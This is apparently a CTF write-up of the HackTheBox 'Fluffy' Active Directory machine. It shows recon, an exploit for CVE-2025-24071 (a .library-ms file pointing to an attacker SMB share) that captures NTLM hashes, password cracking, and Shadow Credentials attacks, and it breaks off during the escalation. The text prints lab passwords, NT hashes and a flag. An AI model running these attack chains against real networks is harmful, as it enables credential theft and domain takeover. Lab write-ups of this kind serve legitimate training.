# Fluffy

## Recon

::: info :information_source: Machine Information
As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: `j.fleischman / J0elTHEM4n1990!`
:::

::: details nmap_scan.log
```log
Open 10.10.11.69:53
Open 10.10.11.69:88
Open 10.10.11.69:139
Open 10.10.11.69:389
Open 10.10.11.69:445
Open 10.10.11.69:464
Open 10.10.11.69:593
Open 10.10.11.69:636
Open 10.10.11.69:3269
Open 10.10.11.69:3268
Open 10.10.11.69:5985
Open 10.10.11.69:9389
Open 10.10.11.69:49667
Open 10.10.11.69:49689
Open 10.10.11.69:49690
Open 10.10.11.69:49693
Open 10.10.11.69:49707
Open 10.10.11.69:49714
Open 10.10.11.69:49755
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.10.11.69

PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2025-07-04 13:55:06Z)
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-04T13:56:38+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.fluffy.htb
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-17T16:04:17
| Not valid after:  2026-04-17T16:04:17
| MD5:   2765:a68f:4883:dc6d:0969:5d0d:3666:c880
| SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681
| -----BEGIN CERTIFICATE-----
| MIIGJzCCBQ+gAwIBAgITUAAAAAJKRwEaLBjVaAAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGZmx1ZmZ5
| MRcwFQYDVQQDEw5mbHVmZnktREMwMS1DQTAeFw0yNTA0MTcxNjA0MTdaFw0yNjA0
| MTcxNjA0MTdaMBoxGDAWBgNVBAMTD0RDMDEuZmx1ZmZ5Lmh0YjCCASIwDQYJKoZI
| hvcNAQEBBQADggEPADCCAQoCggEBAOFkXHPh6Bv/Ejx+B3dfWbqtAmtOZY7gT6XO
| KD/ljfOwRrRuvKhf6b4Qam7mZ08lU7Z9etWUIGW27NNoK5qwMnXzw/sYDgGMNVn4
| bb/2kjQES+HFs0Hzd+s/BBcSSp1BnAgjbBDcW/SXelcyOeDmkDKTHS7gKR9zEvK3
| ozNNc9nFPj8GUYXYrEbImIrisUu83blL/1FERqAFbgGwKP5G/YtX8BgwO7iJIqoa
| 8bQHdMuugURvQptI+7YX7iwDFzMPo4sWfueINF49SZ9MwbOFVHHwSlclyvBiKGg8
| EmXJWD6q7H04xPcBdmDtbWQIGSsHiAj3EELcHbLh8cvk419RD5ECAwEAAaOCAzgw
| ggM0MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABs
| AGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQD
| AgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQME
| AgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglg
| hkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFMlh3+130Pna
| 0Hgb9AX2e8Uhyr0FMB8GA1UdIwQYMBaAFLZo6VUJI0gwnx+vL8f7rAgMKn0RMIHI
| BgNVHR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPWZsdWZmeS1EQzAxLUNB
| LENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERDPWh0Yj9jZXJ0aWZp
| Y2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0
| aW9uUG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6
| Ly8vQ049Zmx1ZmZ5LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNl
| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERD
| PWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlv
| bkF1dGhvcml0eTA7BgNVHREENDAyoB8GCSsGAQQBgjcZAaASBBB0co4Ym5z7RbSI
| 5tsj1jN/gg9EQzAxLmZsdWZmeS5odGIwTgYJKwYBBAGCNxkCBEEwP6A9BgorBgEE
| AYI3GQIBoC8ELVMtMS01LTIxLTQ5NzU1MDc2OC0yNzk3NzE2MjQ4LTI2MjcwNjQ1
| NzctMTAwMDANBgkqhkiG9w0BAQsFAAOCAQEAWjL2YkginWECPSm1EZyi8lPQisMm
| VNF2Ab2I8w/neK2EiXtN+3Z7W5xMZ20mC72lMaj8dLNN/xpJ9WIvQWrjXTO4NC2o
| 53OoRmAJdExwliBfAdKY0bc3GaKSLogT209lxqt+kO0fM2BpYnlP+N3R8mVEX2Fk
| 1WXCOK7M8oQrbaTPGtrDesMYrd7FQNTbZUCkunFRf85g/ZCAjshXrA3ERi32pEET
| eV9dUA0b1o+EkjChv+b1Eyt5unH3RDXpA9uvgpTJSFg1XZucmEbcdICBV6VshMJc
| 9r5Zuo/LdOGg/tqrZV8cNR/AusGMNslltUAYtK3HyjETE/REiQgwS9mBbQ==
|_-----END CERTIFICATE-----
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.fluffy.htb
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-17T16:04:17
| Not valid after:  2026-04-17T16:04:17
| MD5:   2765:a68f:4883:dc6d:0969:5d0d:3666:c880
| SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681
|_ssl-date: 2025-07-04T13:56:38+00:00; +7h00m00s from scanner time.
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-04T13:56:38+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.fluffy.htb
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-17T16:04:17
| Not valid after:  2026-04-17T16:04:17
| MD5:   2765:a68f:4883:dc6d:0969:5d0d:3666:c880
| SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681
3269/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-04T13:56:38+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.fluffy.htb
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-17T16:04:17
| Not valid after:  2026-04-17T16:04:17
| MD5:   2765:a68f:4883:dc6d:0969:5d0d:3666:c880
| SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49689/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         syn-ack Microsoft Windows RPC
49693/tcp open  msrpc         syn-ack Microsoft Windows RPC
49707/tcp open  msrpc         syn-ack Microsoft Windows RPC
49714/tcp open  msrpc         syn-ack Microsoft Windows RPC
49755/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-07-04T13:56:02
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 53865/tcp): CLEAN (Timeout)
|   Check 2 (port 48267/tcp): CLEAN (Timeout)
|   Check 3 (port 5751/udp): CLEAN (Timeout)
|   Check 4 (port 58638/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
```
:::

## General Enumeration

```bash
└─$ py cicada-mastertul.py -q -u 'j.fleischman' -p 'J0elTHEM4n1990!' -t 10.10.11.69 -d fluffy.htb --full
----------------HAPPY HAUNTING!!----------------
Target IP: 10.10.11.69
Domain: fluffy.htb
Username: j.fleischman
Password: J0elTHEM4n1990!

Full Mode Enabled
------------------------------------------------
[!] Enumerating SMB...
[~] Commnad: faketime -f +7h netexec smb fluffy.htb --timeout 99 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --shares
[+] SMB share drive names saved to /home/woyag/Desktop/Rooms/Fluffy/mastertool/10.10.11.69/smb_results/share_names.txt
[+] SMB share drives list saved to /home/woyag/Desktop/Rooms/Fluffy/mastertool/10.10.11.69/smb_results/share_drives.txt
[*] Downloading SMB share files to /home/woyag/Desktop/Rooms/Fluffy/mastertool/10.10.11.69/smb_results
[~] Commnad: faketime -f +7h netexec smb fluffy.htb --timeout 99 -u 'j.fleischman' -p 'J0elTHEM4n1990!' -M spider_plus -o DOWNLOAD_FLAG=True
[!] Connecting to WinRM...
[~] Commnad: faketime -f +7h netexec winrm fluffy.htb --timeout 99 -u 'j.fleischman' -p 'J0elTHEM4n1990!'
[-] Could not connect to WinRM
[!] Enumerating users with netexec rib bruteforce (up to 5000)...
[~] Commnad: faketime -f +7h netexec smb fluffy.htb --timeout 99 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --rid-brute 5000
[+] Lookupsids saved to /home/woyag/Desktop/Rooms/Fluffy/mastertool/10.10.11.69/lookupsid_results/lookupsid.txt
[+] Users list saved to /home/woyag/Desktop/Rooms/Fluffy/mastertool/10.10.11.69/lookupsid_results/users.txt
[!] Enumerating NPUsers using impacket...
[~] Commnad: faketime -f +7h impacket-GetNPUsers 'fluffy.htb'/'j.fleischman':'J0elTHEM4n1990!'@'10.10.11.69'  -usersfile /home/woyag/Desktop/Rooms/Fluffy/mastertool/10.10.11.69/lookupsid_results/users.txt
[-] No NPUsers found
[!] Enumerating UserSPNs using impacket...
[~] Commnad: faketime -f +7h impacket-GetUserSPNs 'fluffy.htb'/'j.fleischman':'J0elTHEM4n1990!'@'10.10.11.69'  -request -dc-host fluffy.htb
[-] No UserSPNs found
[!] Collecting Bloodhound Files...
[~] Commnad: faketime -f +7h bloodhound-python -d fluffy.htb -u 'j.fleischman' -ns 10.10.11.69 -c all --dns-timeout 100 --zip -op j.fleischman -p 'J0elTHEM4n1990!'
[+] Bloodhound saved to /home/woyag/Desktop/Rooms/Fluffy/mastertool/10.10.11.69/bloodhound_results
[!] Enumerating LDAP...
[~] Commnad: faketime -f +7h ldapdomaindump -u 'fluffy.htb\j.fleischman' -dc-ip 10.10.11.69 -o /home/woyag/Desktop/Rooms/Fluffy/mastertool/10.10.11.69/ldap_results -p 'J0elTHEM4n1990!'
[+] LDAP saved to /home/woyag/Desktop/Rooms/Fluffy/mastertool/10.10.11.69/ldap_results
[!x!] Cleaning up...
```

To get inside the machine we need account with **Remote Management Users** group which is `winrm_svc`. Given user is not part of any groups.

![Writeup.png](/assets/pentest/htb/fluffy/Writeup.png)

## SMB

Enumerate SMB. We have access to IT share with READ and WRITE permissions.
```bash
└─$ netexec smb 10.10.11.69 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --shares
SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.69     445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990!
SMB         10.10.11.69     445    DC01             [*] Enumerated shares
SMB         10.10.11.69     445    DC01             Share           Permissions     Remark
SMB         10.10.11.69     445    DC01             -----           -----------     ------
SMB         10.10.11.69     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.69     445    DC01             C$                              Default share
SMB         10.10.11.69     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.69     445    DC01             IT              READ,WRITE
SMB         10.10.11.69     445    DC01             NETLOGON        READ            Logon server share
SMB         10.10.11.69     445    DC01             SYSVOL          READ            Logon server share
```

```bash
└─$ smbclient -U 'FLUFFY.HTB'/'j.fleischman'%'J0elTHEM4n1990!' //10.10.11.69/IT
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jul  4 09:59:23 2025
  ..                                  D        0  Fri Jul  4 09:59:23 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 11:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 11:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 11:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 11:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 10:31:07 2025

                5842943 blocks of size 4096. 2255365 blocks available
```

NetExec spider module seems to have missed some of the files.
```bash
└─$ tree mastertool/10.10.11.69/smb_results/spider/IT
mastertool/10.10.11.69/smb_results/spider/IT
└── KeePass-2.58
    ├── KeePass.exe.config
    ├── License.txt
    └── XSL
        ├── KDBX_Common.xsl
        ├── KDBX_DetailsFull_HTML.xsl
        ├── KDBX_DetailsLight_HTML.xsl
        ├── KDBX_PasswordsOnly_TXT.xsl
        └── KDBX_Tabular_HTML.xsl

3 directories, 7 files
```

Dump manually~
```bash
└─$ smbclient -U 'FLUFFY.HTB'/'j.fleischman'%'J0elTHEM4n1990!' //10.10.11.69/IT
Try "help" to get a list of possible commands.
smb: \> recurse
smb: \> prompt
smb: \> mget *
getting file \Everything-1.4.1.1026.x64.zip of size 1827464 as Everything-1.4.1.1026.x64.zip (1292.3 KiloBytes/sec) (average 1292.3 KiloBytes/sec)
getting file \KeePass-2.58.zip of size 3225346 as KeePass-2.58.zip (912.7 KiloBytes/sec) (average 1021.2 KiloBytes/sec)
getting file \Upgrade_Notice.pdf of size 169963 as Upgrade_Notice.pdf (337.4 KiloBytes/sec) (average 958.0 KiloBytes/sec)
getting file \Everything-1.4.1.1026.x64\everything.exe of size 2265104 as Everything-1.4.1.1026.x64/everything.exe (945.3 KiloBytes/sec) (average 954.1 KiloBytes/sec)
getting file \Everything-1.4.1.1026.x64\Everything.lng of size 958342 as Everything-1.4.1.1026.x64/Everything.lng (842.4 KiloBytes/sec) (average 940.0 KiloBytes/sec)
getting file \KeePass-2.58\KeePass.chm of size 768478 as KeePass-2.58/KeePass.chm (875.7 KiloBytes/sec) (average 934.3 KiloBytes/sec)
getting file \KeePass-2.58\KeePass.exe of size 3305824 as KeePass-2.58/KeePass.exe (962.2 KiloBytes/sec) (average 941.5 KiloBytes/sec)
getting file \KeePass-2.58\KeePass.exe.config of size 763 as KeePass-2.58/KeePass.exe.config (1.8 KiloBytes/sec) (average 911.9 KiloBytes/sec)
getting file \KeePass-2.58\KeePass.XmlSerializers.dll of size 463264 as KeePass-2.58/KeePass.XmlSerializers.dll (619.7 KiloBytes/sec) (average 896.8 KiloBytes/sec)
getting file \KeePass-2.58\KeePassLibC32.dll of size 609136 as KeePass-2.58/KeePassLibC32.dll (551.8 KiloBytes/sec) (average 872.4 KiloBytes/sec)
getting file \KeePass-2.58\KeePassLibC64.dll of size 785776 as KeePass-2.58/KeePassLibC64.dll (623.4 KiloBytes/sec) (average 853.7 KiloBytes/sec)
getting file \KeePass-2.58\License.txt of size 18710 as KeePass-2.58/License.txt (45.9 KiloBytes/sec) (average 834.7 KiloBytes/sec)
getting file \KeePass-2.58\ShInstUtil.exe of size 97128 as KeePass-2.58/ShInstUtil.exe (230.8 KiloBytes/sec) (average 820.3 KiloBytes/sec)
getting file \KeePass-2.58\XSL\KDBX_Common.xsl of size 2732 as KeePass-2.58/XSL/KDBX_Common.xsl (3.5 KiloBytes/sec) (average 786.0 KiloBytes/sec)
getting file \KeePass-2.58\XSL\KDBX_DetailsFull_HTML.xsl of size 3556 as KeePass-2.58/XSL/KDBX_DetailsFull_HTML.xsl (4.0 KiloBytes/sec) (average 749.8 KiloBytes/sec)
getting file \KeePass-2.58\XSL\KDBX_DetailsLight_HTML.xsl of size 3098 as KeePass-2.58/XSL/KDBX_DetailsLight_HTML.xsl (3.2 KiloBytes/sec) (average 714.4 KiloBytes/sec)
getting file \KeePass-2.58\XSL\KDBX_PasswordsOnly_TXT.xsl of size 919 as KeePass-2.58/XSL/KDBX_PasswordsOnly_TXT.xsl (1.0 KiloBytes/sec) (average 683.4 KiloBytes/sec)
getting file \KeePass-2.58\XSL\KDBX_Tabular_HTML.xsl of size 3100 as KeePass-2.58/XSL/KDBX_Tabular_HTML.xsl (3.7 KiloBytes/sec) (average 657.7 KiloBytes/sec)
smb: \> exit

└─$ tree
.
├── Everything-1.4.1.1026.x64
│   ├── everything.exe
│   └── Everything.lng
├── Everything-1.4.1.1026.x64.zip
├── KeePass-2.58
│   ├── KeePass.chm
│   ├── KeePass.exe
│   ├── KeePass.exe.config
│   ├── KeePassLibC32.dll
│   ├── KeePassLibC64.dll
│   ├── KeePass.XmlSerializers.dll
│   ├── Languages
│   ├── License.txt
│   ├── Plugins
│   ├── ShInstUtil.exe
│   └── XSL
│       ├── KDBX_Common.xsl
│       ├── KDBX_DetailsFull_HTML.xsl
│       ├── KDBX_DetailsLight_HTML.xsl
│       ├── KDBX_PasswordsOnly_TXT.xsl
│       └── KDBX_Tabular_HTML.xsl
├── KeePass-2.58.zip
└── Upgrade_Notice.pdf
```

![Writeup-1.png](/assets/pentest/htb/fluffy/Writeup-1.png)

1. [CVE-2025-24996: NTLM Hash Disclosure Spoofing Vulnerability](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-24996)
2. [CVE-2025-24071: Microsoft Windows File Explorer Spoofing Vulnerability](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-24071)
3. [CVE-2025-46785: Buffer over-read in some Zoom Workplace Apps for Windows may allow an authenticated user to conduct a denial of service via network access](https://github.com/advisories/GHSA-v68q-76v8-92qh)
4. [CVE-2025-29968: Improper input validation in Active Directory Certificate Services (AD CS) allows an authorized attacker to deny service over a network.](https://github.com/advisories/GHSA-xvfx-x2hm-pgf5)
5. [CVE-2025-21193: Active Directory Federation Server Spoofing Vulnerability](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-21193)
6. [CVE-2025-3445: Wolfi vulnerability analysis and mitigation](https://www.wiz.io/vulnerability-database/cve/cve-2025-3445)

### Microsoft Windows File Explorer Spoofing Vulnerability

[CVE-2025-24071](https://github.com/ThemeHackers/CVE-2025-24071) has a public POC.
```bash
└─$ git clone -q https://github.com/ThemeHackers/CVE-2025-24071.git
└─$ py CVE-2025-24071/exploit.py -f letmein -i 10.10.14.18
...
Output file: exploit.zip
Run this file on the victim machine and you will see the effects of the vulnerability such as using ftp smb to send files etc.

└─$ unzip exploit.zip
Archive:  exploit.zip
  inflating: letmein.library-ms

└─$ cat letmein.library-ms
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\10.10.14.18\shared</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

Upload the file
```bash
└─$ smbclient -U 'FLUFFY.HTB'/'j.fleischman'%'J0elTHEM4n1990!' //10.10.11.69/IT
Try "help" to get a list of possible commands.
smb: \> put exploit.zip
```

Listen on smb
```bash
└─$ impacket-smbserver shared . -ts -smb2support
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[2025-07-04 03:41:40] [*] Config file parsed
[2025-07-04 03:41:40] [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[2025-07-04 03:41:40] [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[2025-07-04 03:41:40] [*] Config file parsed
[2025-07-04 03:41:40] [*] Config file parsed
[2025-07-04 03:42:21] [*] Incoming connection (10.10.11.69,49711)
[2025-07-04 03:42:21] [*] AUTHENTICATE_MESSAGE (FLUFFY\p.agila,DC01)
[2025-07-04 03:42:21] [*] User DC01\p.agila authenticated successfully
[2025-07-04 03:42:21] [*] p.agila::FLUFFY:aaaaaaaaaaaaaaaa:675be7d0d278529a412ea45266f50c8d:010100000000000080eca82cb7ecdb01c8b391ea9f1f6e8e000000000100100069006f00700067006a004800430044000300100069006f00700067006a00480043004400020010006500680069004c004100640066004c00040010006500680069004c004100640066004c000700080080eca82cb7ecdb01060004000200000008003000300000000000000001000000002000002e42f931ea344a3b7e49dab9dae1d06f3e853fa8ab5e4c1ba4317eaddcd842850a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00310038000000000000000000
[2025-07-04 03:42:21] [*] Closing down connection (10.10.11.69,49711)
[2025-07-04 03:42:21] [*] Remaining connections []
[2025-07-04 03:42:21] [*] Incoming connection (10.10.11.69,49712)
[2025-07-04 03:42:22] [*] AUTHENTICATE_MESSAGE (FLUFFY\p.agila,DC01)
[2025-07-04 03:42:22] [*] User DC01\p.agila authenticated successfully
[2025-07-04 03:42:22] [*] p.agila::FLUFFY:aaaaaaaaaaaaaaaa:258b0035449d6a3aa04f8056f9b39253:010100000000000080eca82cb7ecdb0149cfad6e29a38e8f000000000100100069006f00700067006a004800430044000300100069006f00700067006a00480043004400020010006500680069004c004100640066004c00040010006500680069004c004100640066004c000700080080eca82cb7ecdb01060004000200000008003000300000000000000001000000002000002e42f931ea344a3b7e49dab9dae1d06f3e853fa8ab5e4c1ba4317eaddcd842850a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00310038000000000000000000
```

![Writeup-2.png](/assets/pentest/htb/fluffy/Writeup-2.png)

Crack the hash
```bash
➜ .\john-1.9.0-jumbo-1-win64\run\john.exe .\hashes.txt --wordlist=.\rockyou.txt
Warning: detected hash type "netntlmv2", but the string is also recognized as "ntlmv2-opencl"
Use the "--format=ntlmv2-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
prometheusx-303  (p.agila)
1g 0:00:00:02 DONE (2025-07-04 11:44) 0.3344g/s 1510Kp/s 1510Kc/s 1510KC/s prrm18652886..programmer_pt
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session complete
```

```bash
└─$ netexec smb 10.10.11.69 -u 'p.agila' -p 'prometheusx-303' --shares
SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.69     445    DC01             [+] fluffy.htb\p.agila:prometheusx-303
SMB         10.10.11.69     445    DC01             [*] Enumerated shares
SMB         10.10.11.69     445    DC01             Share           Permissions     Remark
SMB         10.10.11.69     445    DC01             -----           -----------     ------
SMB         10.10.11.69     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.69     445    DC01             C$                              Default share
SMB         10.10.11.69     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.69     445    DC01             IT              READ,WRITE
SMB         10.10.11.69     445    DC01             NETLOGON        READ            Logon server share
SMB         10.10.11.69     445    DC01             SYSVOL          READ            Logon server share
```

::: tip :bulb: Creds
`p.agila:prometheusx-303`
:::

## Lateral Movement (p.agila -> winrm_svc)

`p.agila` user is part of **Service Account Managers**. This group has **GenericAll** access to **Service Accounts**, and this group has **GenericWrite** access on `winrm_svc` account. 

![Writeup-3.png](/assets/pentest/htb/fluffy/Writeup-3.png)

### Shadow Credentials

Use **Shadow Credentials** attack to obtain NTLM hash for svc account.
```bash
└─$ faketime -f +7h certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -account 'winrm_svc' -target 'dc01.fluffy.htb' -dc-ip '10.10.11.69'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '7678f830-55a1-24fe-4f72-c6f0406bf063'
[*] Adding Key Credential with device ID '7678f830-55a1-24fe-4f72-c6f0406bf063' to the Key Credentials for 'winrm_svc'
[*] Successfully added Key Credential with device ID '7678f830-55a1-24fe-4f72-c6f0406bf063' to the Key Credentials for 'winrm_svc'
[*] Authenticating as 'winrm_svc' with the certificate
[*] Using principal: winrm_svc@fluffy.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Restoring the old Key Credentials for 'winrm_svc'
[*] Successfully restored the old Key Credentials for 'winrm_svc'
[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767
```

## WinRM

```powershell
└─$ netexec winrm 10.10.11.69 -u 'winrm_svc' -H '33bd09dcd697600edf6b3a7af4875767'
WINRM       10.10.11.69     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb)
WINRM       10.10.11.69     5985   DC01             [+] fluffy.htb\winrm_svc:33bd09dcd697600edf6b3a7af4875767 (Pwn3d!)

└─$ evil-winrm -i 10.10.11.69 -u 'winrm_svc' -H '33bd09dcd697600edf6b3a7af4875767'
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> whoami /all
User Name        SID
================ =============================================
fluffy\winrm_svc S-1-5-21-497550768-2797716248-2627064577-1603

Group Name                                  Type             SID                                           Attributes
=========================================== ================ ============================================= ==================================================
Everyone                                    Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
FLUFFY\Service Accounts                     Group            S-1-5-21-497550768-2797716248-2627064577-1607 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

### User.txt

```powershell
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> cat ../Desktop/user.txt
b6c51bbaa46314f3d4cef47b0f91e5c1
```

## Privilege Escalation

`winrm_svc` has **GenericWrite** permissions over `ldap_svc` and `ca_svc` meaning we can use Shadow Credentials again to access these accounts.

![Writeup-4.png](/assets/pentest/htb/fluffy/Writeup-4.png)

### Certificates

Most likely there's going to be a vulnerable certificate on DC
```bash
└─$ faketime -f +7h certipy-ad shadow auto -u 'winrm_svc@fluffy.htb' -hashes ':33bd09dcd697600edf6b3a7af4875767' -account 'ca_svc' -target 'dc01.fluffy.htb' -dc-ip '10.10.11.69'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '58bbe192-9c06-7620-875d-3620d84f0e6f'
